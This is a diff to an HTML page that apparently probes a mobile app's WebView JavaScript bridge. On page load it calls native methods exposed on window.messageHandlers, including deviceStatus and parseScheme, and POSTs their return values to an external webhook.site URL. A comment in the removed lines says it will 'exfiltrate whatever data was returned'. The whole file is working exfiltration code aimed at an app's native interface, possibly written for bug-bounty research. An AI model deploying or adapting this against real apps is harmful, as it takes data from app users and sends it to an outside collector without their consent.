@@ -1,20 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head><title>Bridge Data Audit</title></head>
+<head><title>Method Output Audit</title></head>
 <body>
     <script>
         window.onload = function() {
-            let logData = {};
+            let Results = {
+                deviceStatusOutput: "Not Called",
+                parseSchemeOutput: "Not Called",
+                updateUserPrefOutput: "Not Called"
+            };
 
             if (typeof window.messageHandlers !== 'undefined') {
-                // Try executing common methods to see if they return data strings
-                try { logData.deviceStatus = window.messageHandlers.deviceStatus(); } catch(e){}
-                try { logData.toStringVal = window.messageHandlers.toString(); } catch(e){}
                 
-                // Exfiltrate whatever data was returned to your webhook
+                // 1. Test deviceStatus()
+                try {
+                    if (typeof window.messageHandlers.deviceStatus === 'function') {
+                        Results.deviceStatusOutput = window.messageHandlers.deviceStatus();
+                    } else {
+                        Results.deviceStatusOutput = "Method not found or not a function";
+                    }
+                } catch(e) { Results.deviceStatusOutput = "Error: " + e.message; }
+
+                // 2. Test parseScheme() with a dummy string to see if it returns text
+                try {
+                    if (typeof window.messageHandlers.parseScheme === 'function') {
+                        Results.parseSchemeOutput = window.messageHandlers.parseScheme("test_string");
+                    } else {
+                        Results.parseSchemeOutput = "Method not found";
+                    }
+                } catch(e) { Results.parseSchemeOutput = "Error: " + e.message; }
+
+                // Send the actual return values of the functions to your webhook
                 fetch('https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e/', {
                     method: 'POST',
-                    body: JSON.stringify(logData)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(Results)
                 });
             }
         };
